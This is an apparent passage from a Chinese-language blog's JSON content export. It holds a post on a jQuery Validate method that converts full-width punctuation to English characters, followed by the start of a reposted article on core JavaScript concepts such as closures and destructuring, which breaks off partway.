class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 非英文标点符号自动转成英文标点符号，如果还有无法转化的，则给出报错提示。</span><br><span class=\"line\"> */</span><br><span class=\"line\">$.validator.addMethod(&quot;x2en&quot;, function (val, ele, params) &#123;</span><br><span class=\"line\">    // 非英文不包含特殊符号正则</span><br><span class=\"line\">    var reg = /[^\\x00-\\x9f\\xa1-\\xff\\u0000-\\u009f\\u00a1-\\u00ff\\u0021-\\u002c\\u002e\\u002f\\u003a-\\u0040\\u0043\\u0046\\u005b-\\u0060\\u007b-\\u007d\\u00a1-\\u00ac\\u00ae-\\u0113\\u0116-\\u0122\\u0124-\\u012b\\u012e-\\u014d\\u0150-\\u017e\\u0192\\u01b5\\u01f5\\u0237\\u02c6\\u02c7\\u02d8-\\u02dd\\u0311\\u0391-\\u03a1\\u03a3-\\u03a9\\u03b1-\\u03c9\\u03d1\\u03d2\\u03d5\\u03d6\\u03dc\\u03dd\\u03f0\\u03f1\\u03f5\\u03f6\\u0401-\\u040c\\u040e-\\u044f\\u0451-\\u045c\\u045e\\u045f\\u2010\\u2013\\u2015\\u2016\\u2018-\\u201a\\u201c-\\u201e\\u2020-\\u2022\\u2025\\u2026\\u2030-\\u2035\\u2039\\u203a\\u203e\\u2041\\u2043\\u2044\\u20ac\\u20db\\u20dc\\u2102\\u2105\\u210a-\\u2113\\u2115-\\u211e\\u2122\\u2124\\u2127-\\u2129\\u212c\\u212d\\u212f-\\u2131\\u2133-\\u2138\\u2153-\\u215e\\u2190-\\u219b\\u219d-\\u21a7\\u21a9-\\u21ae\\u21b0-\\u21b3\\u21b5-\\u21b7\\u21ba-\\u21db\\u21dd\\u21e4\\u21e5\\u2200-\\u2205\\u2207-\\u2209\\u220b\\u220c\\u220f-\\u2214\\u2216-\\u2218\\u221a\\u221d-\\u2238\\u223a-\\u2257\\u2259\\u225a\\u225c\\u225f-\\u2262\\u2264-\\u228b\\u228d-\\u229b\\u229d-\\u22a5\\u22a7-\\u22b0\\u22b2-\\u22bb\\u22bd-\\u22db\\u22de-\\u22e3\\u22e6-\\u22f1\\u2305\\u2306\\u2308-\\u2310\\u2312\\u2313\\u2315\\u2316\\u231c-\\u231f\\u2322\\u2323\\u232d\\u232e\\u2336\\u233d\\u233f\\u2423\\u24c8\\u2500\\u2502\\u250c\\u2510\\u2514\\u2518\\u251c\\u2524\\u252c\\u2534\\u253c\\u2550-\\u256c\\u2580\\u2584\\u2588\\u2591-\\u2593\\u25aa\\u25ab\\u25ad\\u25ae\\u25b1\\u25b3-\\u25b5\\u25b8\\u25b9\\u25bd-\\u25bf\\u25c2\\u25c3\\u25ca\\u25cb\\u25ec\\u25ef\\u2605\\u2606\\u260e\\u2640\\u2642\\u2660\\u2663\\u2665\\u2666\\u266a\\u266d-\\u266f\\u2713\\u2717\\u2720\\u2736\\u2758\\u2772\\u2773\\u2935\\u2985\\u2986\\u29bf\\u2a00-\\u2a02\\u2a04\\u2a06\\u2a0c\\u2a0d\\u2a10-\\u2a17\\u2a22-\\u2a27\\u2a29\\u2a2a\\u2a2d-\\u2a31\\u2a33-\\u2a3c\\u2a3f\\u2a40\\u2a42-\\u2a4d\\u2a50\\u2a53-\\u2a58\\u2a5a-\\u2a5d\\u2a5f\\u2a66\\u2a6a\\u2a6d-\\u2a75\\u2a77-\\u2a9a\\u2a9d-\\u2aa2\\u2aa4-\\u2ab0\\u2ab3-\\u2ac8\\u2acb\\u2acc\\u2acf-\\u2adb\\u2ae4\\u2ae6-\\u2ae9\\u2aeb-\\u2af3\\u2afd\\ufb00-\\ufb04]/g;</span><br><span class=\"line\"></span><br><span class=\"line\">    var $input = $(ele),</span><br><span class=\"line\">        $container = $input.parents(&apos;.J-x2en-contianer&apos;).length &gt; 0 ? $input.parents(&apos;.J-x2en-contianer&apos;) : $input.parents(&apos;.form-item&apos;),</span><br><span class=\"line\">        $autoEnExtra = $container.find(&apos;.J-x2en-feedback&apos;),</span><br><span class=\"line\">        $tip = $autoEnExtra.find(&apos;.J-m-tip&apos;);</span><br><span class=\"line\">    // 中文符号及其他全角符号转成英文及半角符号，规则同富文本</span><br><span class=\"line\">    var CnToEn = function (cdata) &#123;</span><br><span class=\"line\">        var replaceString = new Array(/｀/g, &quot;`&quot;, /～/g, &quot;~&quot;, /！/g, &quot;!&quot;, /＃/g, &quot;#&quot;, /＄/g, &quot;$&quot;, /％/g, &quot;%&quot;, /（/g, &quot;(&quot;, /）/g, &quot;)&quot;, /“/g, &quot;\\&quot;&quot;, /”/g, &quot;\\&quot;&quot;, /；/g, &quot;;&quot;, /：/g, &quot;:&quot;, /，/g, &quot;,&quot;, /。|．/g, &quot;.&quot;, /？/g, &quot;?&quot;, / /g, &quot; &quot;, /＇/g, &quot;&apos;&quot;, /‘/g, &quot;&apos;&quot;, /’/g, &quot;&apos;&quot;, /／/g, &quot;/&quot;, /＂/g, &quot;\\&quot;&quot;, /＜/g, &quot;&lt;&quot;, /＞/g, &quot;&gt;&quot;, /＊/g, &quot;*&quot;, /＆/g, &quot;&amp;&quot;, /＠/g, &quot;@&quot;, /＾/g, &quot;^&quot;, /＋/g, &quot;+&quot;, /｜/g, &quot;|&quot;, /＼/g, &quot;\\\\&quot;, /．/g, &quot;.&quot;, /＿/g, &quot;_&quot;, /＝/g, &quot;=&quot;, /－/g, &quot;-&quot;, /……/g, &quot;...&quot;, /１/g, &quot;1&quot;, /２/g, &quot;2&quot;, /３/g, &quot;3&quot;, /４/g, &quot;4&quot;, /５/g, &quot;5&quot;, /６/g, &quot;6&quot;, /７/g, &quot;7&quot;, /８/g, &quot;8&quot;, /９/g, &quot;9&quot;, /０/g, &quot;0&quot;, /、/g, &quot;,&quot;, /｛/g, &quot;&#123;&quot;, /｝/g, &quot;&#125;&quot;, /［/g, &quot;[&quot;, /］/g, &quot;]&quot;, /Ａ/g, &quot;A&quot;, /Ｂ/g, &quot;B&quot;, /Ｃ/g, &quot;C&quot;, /Ｄ/g, &quot;D&quot;, /Ｅ/g, &quot;E&quot;, /Ｆ/g, &quot;F&quot;, /Ｇ/g, &quot;G&quot;, /Ｈ/g, &quot;H&quot;, /Ｉ/g, &quot;I&quot;, /Ｊ/g, &quot;J&quot;, /Ｋ/g, &quot;K&quot;, /Ｌ/g, &quot;L&quot;, /Ｍ/g, &quot;M&quot;, /Ｎ/g, &quot;N&quot;, /Ｏ/g, &quot;O&quot;, /Ｐ/g, &quot;P&quot;, /Ｑ/g, &quot;Q&quot;, /Ｒ/g, &quot;R&quot;, /Ｓ/g, &quot;S&quot;, /Ｔ/g, &quot;T&quot;, /Ｕ/g, &quot;U&quot;, /Ｖ/g, &quot;V&quot;, /Ｗ/g, &quot;W&quot;, /Ｘ/g, &quot;X&quot;, /Ｙ/g, &quot;Y&quot;, /Ｚ/g, &quot;Z&quot;, /ａ/g, &quot;a&quot;, /ｂ/g, &quot;b&quot;, /ｃ/g, &quot;c&quot;, /ｄ/g, &quot;d&quot;, /ｅ/g, &quot;e&quot;, /ｆ/g, &quot;f&quot;, /ｇ/g, &quot;g&quot;, /ｈ/g, &quot;h&quot;, /ｉ/g, &quot;i&quot;, /ｊ/g, &quot;j&quot;, /ｋ/g, &quot;k&quot;, /ｌ/g, &quot;l&quot;, /ｍ/g, &quot;m&quot;, /ｎ/g, &quot;n&quot;, /ｏ/g, &quot;o&quot;, /ｐ/g, &quot;p&quot;, /ｑ/g, &quot;q&quot;, /ｒ/g, &quot;r&quot;, /ｓ/g, &quot;s&quot;, /ｔ/g, &quot;t&quot;, /ｕ/g, &quot;u&quot;, /ｖ/g, &quot;v&quot;, /ｗ/g, &quot;w&quot;, /ｘ/g, &quot;x&quot;, /ｙ/g, &quot;y&quot;, /ｚ/g, &quot;z&quot;,/—/g,&quot;-&quot;,/–/g,&quot;-&quot;);</span><br><span class=\"line\">        for (i = 0; i &lt; replaceString.length; i = i + 2) &#123;</span><br><span class=\"line\">            cdata = cdata.replace(replaceString[i], replaceString[i + 1]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return cdata;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    var result = CnToEn(val);</span><br><span class=\"line\">    $(ele).val(result);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(reg.test(result)) &#123;</span><br><span class=\"line\">        $autoEnExtra.on(&apos;click&apos;, &apos;.J-show-btn&apos;, function()&#123;</span><br><span class=\"line\">            $tip.show();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        $autoEnExtra.on(&apos;click&apos;, &apos;.J-confirm-btn&apos;, function()&#123;</span><br><span class=\"line\">            result = result.replace(reg, &apos;&apos;);</span><br><span class=\"line\">            $(ele).val(result).valid();</span><br><span class=\"line\">            $tip.hide();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        $autoEnExtra.on(&apos;click&apos;, &apos;.J-cancel-btn&apos;, function()&#123;</span><br><span class=\"line\">            $tip.hide();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        $autoEnExtra.show();</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;else &#123;</span><br><span class=\"line\">        $autoEnExtra.hide();</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在仅可输入英文字符的输入框内填写中文或其他语言的字符时，会给出报错。如果用户在复制进大段文字中夹杂了少许中文标点符，那么很难排查。因此，需要在原有校验基础上进行交互改进：失焦后标点符号自动转换，还有不能转换的给出提示框，同意则自动删除非法字符，取消则关闭提示框，用户手动修改。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>这是结合<a href=\"https://jqueryvalidation.org/\" target=\"_blank\" rel=\"noopener\">jquery 的 validate 表单验证插件</a>及已有的 UI 组件进行的表单输入框交互改进方案。因此，如果不是 validate 框架则要重写 js 方法，如果是自定义的提示框结构样式，则需要添加相应的钩子：<code>.J-x2en-contianer/.J-x2en-feedback/.J-m-tip/.J-show-btn/.J-confirm-btn/.J-cancel-btn</code>。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-09-19-x2en/x2en.gif\" alt=\"效果展示\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>html 代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div class=&quot;form-item&quot;&gt;</span><br><span class=\"line\">    &lt;label class=&quot;form-label&quot;&gt;remark:&lt;/label&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;div class=&quot;form-fields&quot;&gt;</span><br><span class=\"line\">        &lt;div class=&quot;col-9&quot;&gt;</span><br><span class=\"line\">            &lt;textarea name=&quot;remark&quot; placeholder=&quot;&quot; class=&quot;input-text input-description&quot;&gt;&lt;/textarea&gt;</span><br><span class=\"line\">            &lt;div class=&quot;feedback-block auto-en-feedback J-x2en-feedback&quot; wrapfor=&quot;remark&quot;&gt;</span><br><span class=\"line\">                &lt;div class=&quot;auto-en-extra&quot;&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;javascript:void(0)&quot; class=&quot;J-show-btn&quot;&gt;Not found?&lt;/a&gt;</span><br><span class=\"line\">                    &lt;div class=&quot;m-tip arrow-bottom J-m-tip&quot;&gt;</span><br><span class=\"line\">                        &lt;div class=&quot;tip-con&quot;&gt;</span><br><span class=\"line\">                            The system will help you to delete non-English characters. Are you sure to continue?&lt;br&gt;</span><br><span class=\"line\">                            &lt;a href=&quot;javascript:void(0);&quot; class=&quot;btn btn-main J-confirm-btn&quot;&gt;Confirm&lt;/a&gt;</span><br><span class=\"line\">                            &lt;a href=&quot;javascript:void(0);&quot; class=&quot;btn J-cancel-btn&quot;&gt;Cancel&lt;/a&gt;</span><br><span class=\"line\">                        &lt;/div&gt;</span><br><span class=\"line\">                        &lt;div class=&quot;arrow arrow-out&quot;&gt;</span><br><span class=\"line\">                            &lt;span class=&quot;arrow arrow-in&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">                        &lt;/div&gt;</span><br><span class=\"line\">                    &lt;/div&gt;</span><br><span class=\"line\">                &lt;/div&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<p>validate 扩展方法如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 非英文标点符号自动转成英文标点符号，如果还有无法转化的，则给出报错提示。</span><br><span class=\"line\"> */</span><br><span class=\"line\">$.validator.addMethod(&quot;x2en&quot;, function (val, ele, params) &#123;</span><br><span class=\"line\">    // 非英文不包含特殊符号正则</span><br><span class=\"line\">    var reg = /[^\\x00-\\x9f\\xa1-\\xff\\u0000-\\u009f\\u00a1-\\u00ff\\u0021-\\u002c\\u002e\\u002f\\u003a-\\u0040\\u0043\\u0046\\u005b-\\u0060\\u007b-\\u007d\\u00a1-\\u00ac\\u00ae-\\u0113\\u0116-\\u0122\\u0124-\\u012b\\u012e-\\u014d\\u0150-\\u017e\\u0192\\u01b5\\u01f5\\u0237\\u02c6\\u02c7\\u02d8-\\u02dd\\u0311\\u0391-\\u03a1\\u03a3-\\u03a9\\u03b1-\\u03c9\\u03d1\\u03d2\\u03d5\\u03d6\\u03dc\\u03dd\\u03f0\\u03f1\\u03f5\\u03f6\\u0401-\\u040c\\u040e-\\u044f\\u0451-\\u045c\\u045e\\u045f\\u2010\\u2013\\u2015\\u2016\\u2018-\\u201a\\u201c-\\u201e\\u2020-\\u2022\\u2025\\u2026\\u2030-\\u2035\\u2039\\u203a\\u203e\\u2041\\u2043\\u2044\\u20ac\\u20db\\u20dc\\u2102\\u2105\\u210a-\\u2113\\u2115-\\u211e\\u2122\\u2124\\u2127-\\u2129\\u212c\\u212d\\u212f-\\u2131\\u2133-\\u2138\\u2153-\\u215e\\u2190-\\u219b\\u219d-\\u21a7\\u21a9-\\u21ae\\u21b0-\\u21b3\\u21b5-\\u21b7\\u21ba-\\u21db\\u21dd\\u21e4\\u21e5\\u2200-\\u2205\\u2207-\\u2209\\u220b\\u220c\\u220f-\\u2214\\u2216-\\u2218\\u221a\\u221d-\\u2238\\u223a-\\u2257\\u2259\\u225a\\u225c\\u225f-\\u2262\\u2264-\\u228b\\u228d-\\u229b\\u229d-\\u22a5\\u22a7-\\u22b0\\u22b2-\\u22bb\\u22bd-\\u22db\\u22de-\\u22e3\\u22e6-\\u22f1\\u2305\\u2306\\u2308-\\u2310\\u2312\\u2313\\u2315\\u2316\\u231c-\\u231f\\u2322\\u2323\\u232d\\u232e\\u2336\\u233d\\u233f\\u2423\\u24c8\\u2500\\u2502\\u250c\\u2510\\u2514\\u2518\\u251c\\u2524\\u252c\\u2534\\u253c\\u2550-\\u256c\\u2580\\u2584\\u2588\\u2591-\\u2593\\u25aa\\u25ab\\u25ad\\u25ae\\u25b1\\u25b3-\\u25b5\\u25b8\\u25b9\\u25bd-\\u25bf\\u25c2\\u25c3\\u25ca\\u25cb\\u25ec\\u25ef\\u2605\\u2606\\u260e\\u2640\\u2642\\u2660\\u2663\\u2665\\u2666\\u266a\\u266d-\\u266f\\u2713\\u2717\\u2720\\u2736\\u2758\\u2772\\u2773\\u2935\\u2985\\u2986\\u29bf\\u2a00-\\u2a02\\u2a04\\u2a06\\u2a0c\\u2a0d\\u2a10-\\u2a17\\u2a22-\\u2a27\\u2a29\\u2a2a\\u2a2d-\\u2a31\\u2a33-\\u2a3c\\u2a3f\\u2a40\\u2a42-\\u2a4d\\u2a50\\u2a53-\\u2a58\\u2a5a-\\u2a5d\\u2a5f\\u2a66\\u2a6a\\u2a6d-\\u2a75\\u2a77-\\u2a9a\\u2a9d-\\u2aa2\\u2aa4-\\u2ab0\\u2ab3-\\u2ac8\\u2acb\\u2acc\\u2acf-\\u2adb\\u2ae4\\u2ae6-\\u2ae9\\u2aeb-\\u2af3\\u2afd\\ufb00-\\ufb04]/g;</span><br><span class=\"line\"></span><br><span class=\"line\">    var $input = $(ele),</span><br><span class=\"line\">        $container = $input.parents(&apos;.J-x2en-contianer&apos;).length &gt; 0 ? $input.parents(&apos;.J-x2en-contianer&apos;) : $input.parents(&apos;.form-item&apos;),</span><br><span class=\"line\">        $autoEnExtra = $container.find(&apos;.J-x2en-feedback&apos;),</span><br><span class=\"line\">        $tip = $autoEnExtra.find(&apos;.J-m-tip&apos;);</span><br><span class=\"line\">    // 中文符号及其他全角符号转成英文及半角符号，规则同富文本</span><br><span class=\"line\">    var CnToEn = function (cdata) &#123;</span><br><span class=\"line\">        var replaceString = new Array(/｀/g, &quot;`&quot;, /～/g, &quot;~&quot;, /！/g, &quot;!&quot;, /＃/g, &quot;#&quot;, /＄/g, &quot;$&quot;, /％/g, &quot;%&quot;, /（/g, &quot;(&quot;, /）/g, &quot;)&quot;, /“/g, &quot;\\&quot;&quot;, /”/g, &quot;\\&quot;&quot;, /；/g, &quot;;&quot;, /：/g, &quot;:&quot;, /，/g, &quot;,&quot;, /。|．/g, &quot;.&quot;, /？/g, &quot;?&quot;, / /g, &quot; &quot;, /＇/g, &quot;&apos;&quot;, /‘/g, &quot;&apos;&quot;, /’/g, &quot;&apos;&quot;, /／/g, &quot;/&quot;, /＂/g, &quot;\\&quot;&quot;, /＜/g, &quot;&lt;&quot;, /＞/g, &quot;&gt;&quot;, /＊/g, &quot;*&quot;, /＆/g, &quot;&amp;&quot;, /＠/g, &quot;@&quot;, /＾/g, &quot;^&quot;, /＋/g, &quot;+&quot;, /｜/g, &quot;|&quot;, /＼/g, &quot;\\\\&quot;, /．/g, &quot;.&quot;, /＿/g, &quot;_&quot;, /＝/g, &quot;=&quot;, /－/g, &quot;-&quot;, /……/g, &quot;...&quot;, /１/g, &quot;1&quot;, /２/g, &quot;2&quot;, /３/g, &quot;3&quot;, /４/g, &quot;4&quot;, /５/g, &quot;5&quot;, /６/g, &quot;6&quot;, /７/g, &quot;7&quot;, /８/g, &quot;8&quot;, /９/g, &quot;9&quot;, /０/g, &quot;0&quot;, /、/g, &quot;,&quot;, /｛/g, &quot;&#123;&quot;, /｝/g, &quot;&#125;&quot;, /［/g, &quot;[&quot;, /］/g, &quot;]&quot;, /Ａ/g, &quot;A&quot;, /Ｂ/g, &quot;B&quot;, /Ｃ/g, &quot;C&quot;, /Ｄ/g, &quot;D&quot;, /Ｅ/g, &quot;E&quot;, /Ｆ/g, &quot;F&quot;, /Ｇ/g, &quot;G&quot;, /Ｈ/g, &quot;H&quot;, /Ｉ/g, &quot;I&quot;, /Ｊ/g, &quot;J&quot;, /Ｋ/g, &quot;K&quot;, /Ｌ/g, &quot;L&quot;, /Ｍ/g, &quot;M&quot;, /Ｎ/g, &quot;N&quot;, /Ｏ/g, &quot;O&quot;, /Ｐ/g, &quot;P&quot;, /Ｑ/g, &quot;Q&quot;, /Ｒ/g, &quot;R&quot;, /Ｓ/g, &quot;S&quot;, /Ｔ/g, &quot;T&quot;, /Ｕ/g, &quot;U&quot;, /Ｖ/g, &quot;V&quot;, /Ｗ/g, &quot;W&quot;, /Ｘ/g, &quot;X&quot;, /Ｙ/g, &quot;Y&quot;, /Ｚ/g, &quot;Z&quot;, /ａ/g, &quot;a&quot;, /ｂ/g, &quot;b&quot;, /ｃ/g, &quot;c&quot;, /ｄ/g, &quot;d&quot;, /ｅ/g, &quot;e&quot;, /ｆ/g, &quot;f&quot;, /ｇ/g, &quot;g&quot;, /ｈ/g, &quot;h&quot;, /ｉ/g, &quot;i&quot;, /ｊ/g, &quot;j&quot;, /ｋ/g, &quot;k&quot;, /ｌ/g, &quot;l&quot;, /ｍ/g, &quot;m&quot;, /ｎ/g, &quot;n&quot;, /ｏ/g, &quot;o&quot;, /ｐ/g, &quot;p&quot;, /ｑ/g, &quot;q&quot;, /ｒ/g, &quot;r&quot;, /ｓ/g, &quot;s&quot;, /ｔ/g, &quot;t&quot;, /ｕ/g, &quot;u&quot;, /ｖ/g, &quot;v&quot;, /ｗ/g, &quot;w&quot;, /ｘ/g, &quot;x&quot;, /ｙ/g, &quot;y&quot;, /ｚ/g, &quot;z&quot;,/—/g,&quot;-&quot;,/–/g,&quot;-&quot;);</span><br><span class=\"line\">        for (i = 0; i &lt; replaceString.length; i = i + 2) &#123;</span><br><span class=\"line\">            cdata = cdata.replace(replaceString[i], replaceString[i + 1]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return cdata;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    var result = CnToEn(val);</span><br><span class=\"line\">    $(ele).val(result);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(reg.test(result)) &#123;</span><br><span class=\"line\">        $autoEnExtra.on(&apos;click&apos;, &apos;.J-show-btn&apos;, function()&#123;</span><br><span class=\"line\">            $tip.show();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        $autoEnExtra.on(&apos;click&apos;, &apos;.J-confirm-btn&apos;, function()&#123;</span><br><span class=\"line\">            result = result.replace(reg, &apos;&apos;);</span><br><span class=\"line\">            $(ele).val(result).valid();</span><br><span class=\"line\">            $tip.hide();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        $autoEnExtra.on(&apos;click&apos;, &apos;.J-cancel-btn&apos;, function()&#123;</span><br><span class=\"line\">            $tip.hide();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        $autoEnExtra.show();</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;else &#123;</span><br><span class=\"line\">        $autoEnExtra.hide();</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>"},{"title":"（转）理解这12个概念，让你的JavaScript开发更上一层楼","date":"2019-03-01T05:44:05.000Z","updated":"2019-03-01T05:44:05.000Z","_content":"\n# 概述\nJavaScript 是一门复杂的语言。如果你是一名 JavaScript 开发人员，不管处于什么样的水平，都有必要了解 JavaScript 的基本概念。本文介绍了 12 个非常重要的 JavaScript 概念，但绝对不是说 JavaScript 开发人员只需要知道这些就可以了。\n<!-- more -->\n\n# 详述\n## 1. 变量赋值（值与引用）\nJavaScript 总是按照值来给变量赋值。当指定的值是 JavaScript 的五种原始类型之一（即 Boolean、null、undefined、String 和 Number）时，将为变量分配实际的值。但是，当指定的值是 Array、Function 或 Object 时，将为变量分配内存的对象引用。\n\n在下面的代码段中，使用 var1 对 var2 赋值。由于 var1 是基本类型（String），因此 var2 的值等于 var1 的 String 值，但这个时候可以认为 var2 与 var1 完全不同。因此，重新为 var2 赋值对 var1 没有任何影响。\n\n```js\nlet var1 = 'My string';\nlet var2 = var1;\nvar2 = 'My new string';\nconsole.log(var1);\n// 'My string'\nconsole.log(var2);\n// 'My new string'\n```\n\n我们将它与对象赋值进行比较。\n\n```js\nlet var1 = { name: 'Jim' }\nlet var2 = var1;\nvar2.name = 'John';\nconsole.log(var1);\n// { name: 'John' }\nconsole.log(var2);\n// { name: 'John' }\n```\n如果你期望它会像原始类型赋值那样，很可能会出问题！如果你创建了一个无意中会改变对象的函数，就会出现一些非预期的行为。\n\n## 2. 闭包\n闭包是一种重要的 JavaScript 模式，可用于访问私有变量。在下面的示例中，createGreeter 返回一个匿名函数，这个函数可以访问参数 greeting（在这里是“Hello”）。在后续的调用中，sayHello 将有权访问这个 greeting！\n```js\nfunction createGreeter(greeting) {\n  return function(name) {\n    console.log(greeting + ', ' + name);\n  }\n}\nconst sayHello = createGreeter('Hello');\nsayHello('Joe');\n// Hello, Joe\n```\n在一个更真实的场景中，你可以设想一个初始化函数 apiConnect(apiKey)，它返回一些使用 API密钥的方法。在这种情况下，只需要提供一次 apiKey 即可。\n```js\nfunction apiConnect(apiKey) {\n  function get(route) {\n    return fetch(`${route}?key=${apiKey}`);\n  }\n  function post(route, params) {\n    return fetch(route, {\n      method: 'POST',\n      body: JSON.stringify(params),\n        headers: {\n          'Authorization': `Bearer ${apiKey}`\n        }\n      })\n  }\n  return { get, post }\n}\nconst api = apiConnect('my-secret-key');\n// No need to include the apiKey anymore\napi.get('http://www.example.com/get-endpoint');\napi.post('http://www.example.com/post-endpoint', { name: 'Joe' });\n```\n## 3. 解构\nJavaScript 参数解构是一种从对象中提取属性的常用方法。\n```js\nconst obj = {\n  name: 'Joe',\n  food: 'cake'\n}\nconst { name, food } = obj;\nconsole.log(name, food);\n// 'Joe' 'cake'\n```\n如果需要以其他名称来提取属性，可以使用以下格式来指定它们。\n```js\nconst obj = {\n  name: 'Joe',\n  food: 'cake'\n}\nconst { name: myName, food: myFood } = obj;\nconsole.log(myName, myFood);\n// 'Joe' 'cake'\n```\n在下面的示例中，解构被用来将 person 对象传给 introduce 函数。换句话说，解构可以（并且经常）直接用于提取传给函数的参数。如果你熟悉 React，可能已经见过这个！\n```js\nconst person = {\n  name: 'Eddie',\n  age: 24\n}\nfunction introduce({ name, age }) {\n  console.log(`I'm ${name} and I'm ${age} years old!`);\n}\nconsole.log(introduce(person));\n// \"I'm Eddie and I'm 24 years old!\"\n```\n\n## 4. 展开（spread）语法\n在下面的示例中，Math.max 不能直接接受 arr 数组，因为它的参数不是数组类型，但可以以数组中的各个元素作为参数。展开运算符... 可用于提取数组的各个元素。\n```js\nconst arr = [4, 6, -1, 3, 10, 4];\nconst max = Math.max(...arr);\nconsole.log(max);\n// 10\n```\n\n## 5. 变长参数（rest）语法\n你可以用它将传给函数的任意数量的参数放入数组中！\n```js\nfunction myFunc(...args) {\n  console.log(args[0] + args[1]);\n}\nmyFunc(1, 2, 3, 4);\n// 3\n```\n\n## 6. 数组方法\nJavaScript 数组方法通常可以为你提供令人难以置信的优雅方式来执行所需的数据转换。作为 StackOverflow 的贡献者，我经常看到有关如何以这种或那种方式操纵对象数组的问题。这往往是数组方法的完美用例。\n\n### 